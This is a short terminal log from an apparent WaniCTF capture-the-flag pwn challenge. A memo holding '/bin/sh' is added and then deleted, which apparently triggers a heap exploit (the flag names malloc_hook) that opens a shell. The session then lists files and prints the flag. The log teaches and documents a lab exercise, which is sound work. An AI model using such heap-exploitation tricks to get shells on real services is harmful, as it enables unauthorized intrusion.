```
# nc free.pwn.wanictf.org 9002
1: add memo
2: view memo
9: del memo
command?: 1
index?[0-9]: 0
memo?: /bin/sh



[[[list memos]]]
***** 0 *****
/bin/sh


1: add memo
2: view memo
9: del memo
command?: 9
index?[0-9]: 0
ls
chall
flag.txt
redir.sh
cat flag.txt
FLAG{malloc_hook_is_a_tech_for_heap_exploitation}
```
